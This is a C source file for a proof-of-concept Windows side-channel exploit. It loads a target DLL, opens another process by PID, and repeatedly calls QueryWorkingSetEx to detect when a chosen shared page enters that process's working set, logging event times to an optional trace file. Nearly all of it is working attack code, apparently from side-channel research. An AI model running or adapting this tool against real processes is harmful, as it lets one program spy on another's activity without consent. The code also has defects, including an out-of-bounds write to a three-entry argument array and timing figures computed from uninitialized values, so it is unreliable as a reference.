/*-----------------------------------------------------------------------------
 * main.c
 *
 * A program demonstrating the exploitation of a side channel based on
 * virtual memory and shared memory.
 *
 * Usage: ./ev_chk <-t> [target dll file] [target page] [target pid] <trace name>
 *
 * Erik Kraft
 */

// target windows 8 and higher
#define _WIN32_WINNT 0x0602

/*-----------------------------------------------------------------------------
 * INCLUDES
 */
#include <stdio.h>
#include <stdlib.h>
#include <time.h> 
#include <windows.h>
#include <errno.h>
#include <psapi.h>

/*-----------------------------------------------------------------------------
 * DEFINES
 */
// general defines
#define _DEBUG_

// defines used for parsing command line arguments
#define CREATE_TRACE_SWITCH 0
const char* SWITCHES_STR[] = { "-t", NULL };
#define TARGET_DLL_STR 0
#define TARGET_OFFSET_STR 1
#define TARGET_PID_STR 2
#define TRACE_FILENAME_STR 3
#define ARGS_NON_TRACE 3
#define ARGS_TRACE 4

// defines used for formatting output
#define PENDING "[PENDING] "
#define INFO "[INFO] "
#define DEBUG "[DEBUG] "
#define OK "[OK] "
#define FAIL "[FAIL] "
#define USAGE "[USAGE] "

/*-----------------------------------------------------------------------------
 * MACROS
 */
#ifdef _DEBUG_
#define DEBUG_PRINT(x) printf x
#else
#define DEBUG_PRINT(x) \
    do {               \
    } while(0)
#endif

/*-----------------------------------------------------------------------------
 * FUNCTION PROTOTYPES
 */
void usageError(char* app_name);

/*-----------------------------------------------------------------------------
 * GLOBAL VARIABLES
 */
static int running = 1;
size_t page_size = 0;
LARGE_INTEGER pc_frequency = { 0 };

/*-----------------------------------------------------------------------------
 * SIGNAL HANDLERS
 */
BOOL quitHandler(DWORD fdwCtrlType)
{
  running = 0;
  return TRUE;
}

int main(int argc, char* argv[])
{
  // general variables
  LARGE_INTEGER eviction_start, eviction_end;
  FILETIME utc_timestamp;
  int return_value = 0;

  // variables used for processing command line arguments
  int create_trace = 0;
  size_t target_offset = 0;
  size_t target_pid = 0;
  char* arg_strings[3] = { NULL };
  size_t arg_i = 1, str_i = 0, s = 0;

  // variables used for statistics
  FILE* trace_file = NULL;
  size_t reference_timestamp = 0;
  time_t event_time = 0;
  size_t event_time_utc = 0;
  size_t eviction_count = 0, eviction_time_sum = 0;
  size_t event_counter = 0;

  // variables necessary for general exploit function
  SYSTEM_INFO sys_info;
  MEMORYSTATUSEX mem_stat;
  MEMORY_PRIORITY_INFORMATION mem_priority_info;
  PSAPI_WORKING_SET_EX_INFORMATION page_info;
  ssize_t elapsed_time_eviction_ns = 0;
  size_t event_hold = 0;
  HINSTANCE target_dll_instance = NULL;
  HANDLE h_target_process = NULL;
  size_t current_ws_min_size, current_ws_max_size;
  void* target_address = NULL;

  srand(time(NULL));

  // process command line arguments
  for(; arg_i < argc; arg_i++)
  {
    for(s = 0; SWITCHES_STR[s] != NULL; s++)
    {
      if(strcmp(argv[arg_i], SWITCHES_STR[s]) == 0)
      {
        switch(s)
        {
        case CREATE_TRACE_SWITCH:
          create_trace = 1;
          break;
        }
        break;
      }
    }

    // switches have to be before strings
    if(str_i != 0 && SWITCHES_STR[s] != NULL)
    {
      usageError(argv[0]);
    }
    else if(SWITCHES_STR[s] == NULL)
    {
      // to many argument strings
      if((!create_trace && str_i > ARGS_NON_TRACE) || (create_trace && str_i > ARGS_TRACE))
      {
        usageError(argv[0]);
      }

      arg_strings[str_i] = argv[arg_i];
      str_i++;
    }
  }
  // to less argument strings
  if((!create_trace && str_i < ARGS_NON_TRACE) || (create_trace && str_i < ARGS_TRACE))
  {
    usageError(argv[0]);
  }

  // register signal handler for quiting the program by STRG+C
  if(!SetConsoleCtrlHandler((PHANDLER_ROUTINE)quitHandler, TRUE))
  {
    printf(FAIL "Error (%lu) at SetConsoleCtrlHandler...\n", GetLastError());
    goto error;
  }

  // retrieve frequency of performance counter
  QueryPerformanceFrequency(&pc_frequency);

  // get system information
  GetSystemInfo(&sys_info);
  page_size = sys_info.dwPageSize;

  // get system memory information
  mem_stat.dwLength = sizeof(mem_stat);
  if(!GlobalMemoryStatusEx(&mem_stat))
  {
    printf(FAIL "Error (%lu) at GlobalMemoryStatusEx...\n", GetLastError());
    goto error;
  }
  printf(INFO "Total usable ram: %Iu\n", mem_stat.ullTotalPhys);
  printf(INFO "Available physical ram: %Iu\n", mem_stat.ullAvailPhys);
  printf(INFO "Available paging file memory: %Iu\n", mem_stat.ullAvailPageFile);

  // get current working set size
  if(!GetProcessWorkingSetSize(GetCurrentProcess(), &current_ws_min_size, &current_ws_max_size))
  {
    printf(FAIL "Error (%lu) at GetProcessWorkingSetSize...\n", GetLastError());
    goto error;
  }

  printf(INFO "Process working set size min: %Iu and max: %Iu.\n", current_ws_min_size, current_ws_max_size);

  // calculate target page offset in byte
  target_offset = (size_t)strtol(arg_strings[TARGET_OFFSET_STR], NULL, 10) * page_size;
  printf(INFO "Target offset: %Ix...\n", target_offset);

  target_pid = (size_t)strtol(arg_strings[TARGET_PID_STR], NULL, 10);
  printf(INFO "Target pid: %Iu...\n", target_pid);

  target_dll_instance = LoadLibraryA(arg_strings[TARGET_DLL_STR]);
  if(target_dll_instance == NULL)
  {
    printf(FAIL "Error (%lu) at LoadLibraryA of target dll: %s...\n", GetLastError(), arg_strings[TARGET_DLL_STR]);
    goto error;
  }
  target_address = (void*)target_dll_instance + target_offset;
  printf(INFO "Target address: %p\n", target_address);
  page_info.VirtualAddress = target_address;

  // should also work with PROCESS_QUERY_INFORMATION_LIMITED and PROCESS_SET_QUOTA
  h_target_process = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_SET_QUOTA, TRUE, target_pid);
  if(h_target_process == NULL)
  {
    printf(FAIL "Error (%lu) at OpenProcess...\n", GetLastError());
    goto error;
  }

  // Seems not to be necessary, consider removing
  /*mem_priority_info.MemoryPriority = MEMORY_PRIORITY_VERY_LOW;
  if(!SetProcessInformation(h_target_process, ProcessMemoryPriority,
  &mem_priority_info,sizeof(MEMORY_PRIORITY_INFORMATION)))
  {
       printf(FAIL "Error (%lu) at SetProcessInformation...\n", GetLastError());
     goto error;
  }*/

  if(create_trace)
  {
    trace_file = fopen(arg_strings[TRACE_FILENAME_STR], "w");
    if(trace_file == NULL)
    {
      printf(FAIL "Error (%s) at fopen...\n", strerror(errno));
      goto error;
    }

    if(fprintf(trace_file, "Target dll: %s\nTarget page offset: %Iu\nTime (us);Page in WS\n",
               arg_strings[TARGET_DLL_STR], target_offset / page_size) < 0)
    {
      printf(FAIL "Error (%s) at fprintf...\n", strerror(errno));
      goto error;
    }
  }

  printf(INFO "OK\n");

  GetSystemTimePreciseAsFileTime(&utc_timestamp);
  reference_timestamp = ((((size_t)utc_timestamp.dwHighDateTime) << 32) + utc_timestamp.dwLowDateTime) / 10;
  
  // main loop
  while(running)
  {
    GetSystemTimePreciseAsFileTime(&utc_timestamp);
    event_time_utc = ((((size_t)utc_timestamp.dwHighDateTime) << 32) + utc_timestamp.dwLowDateTime) / 10;
    event_time = time(NULL);

    if(!QueryWorkingSetEx(h_target_process, &page_info, (DWORD)sizeof(PSAPI_WORKING_SET_EX_INFORMATION)))
    {
      printf(FAIL "Error (%lu) at QueryWorkingSetEx...\n", GetLastError());
      goto error;
    }

    // event detected
    if(page_info.VirtualAttributes.Valid)
    {
      if(!event_hold)
      {
        event_hold = 1;
        event_counter++;
        printf(OK "Event fired (count: %Iu, time(NULL): %Iu, utc timestamp: %Iuus)...\n", event_counter,
               event_time, event_time_utc);

        if(create_trace)
        {
          if(fprintf(trace_file, "%Iu;1\n", event_time_utc - reference_timestamp) < 0)
          {
            printf(FAIL "Error (%s) at fprintf...\n", strerror(errno));
            goto error;
          }
        }
      }
  
      // confirm readings with direct reading of tsc coutner (previous code)
      /*QueryPerformanceCounter(&eviction_start);
      if(!SetProcessWorkingSetSize(h_target_process, (size_t) - 1, (size_t) - 1))
      {
        printf(FAIL "Error (%lu) at SetProcessWorkingSetSize for pid %Iu...\n", GetLastError(), target_pid);
        continue;
      }
      QueryPerformanceCounter(&eviction_end);*/

      elapsed_time_eviction_ns = (eviction_end.QuadPart - eviction_start.QuadPart) * 1000000000UL;
      elapsed_time_eviction_ns /= pc_frequency.QuadPart;
      eviction_time_sum += elapsed_time_eviction_ns;

      eviction_count++;
    }
    else if(!page_info.VirtualAttributes.Valid && event_hold)
    {
      printf(OK "Event released, took %Iu ns ...\n\n", elapsed_time_eviction_ns);
      event_hold = 0;
    }

    // Sleep(1);
  }

  if(event_counter > 0)
  {
    printf(INFO "Mean time to eviction per event: %Iu ns...\n", eviction_time_sum / event_counter);
  }

  goto cleanup;

error:
  return_value = -1;

cleanup:

  FreeLibrary(target_dll_instance);
  CloseHandle(h_target_process);

  if(trace_file != NULL)
  {
    fclose(trace_file);
  }

  return return_value;
}

/*-----------------------------------------------------------------------------
 * FUNCTION DEFINITIONS
 */
void usageError(char* app_name)
{
  printf(USAGE "%s <-t> [target dll file] [target page] [target pid] <trace name>\n", app_name);
  exit(-1);
}
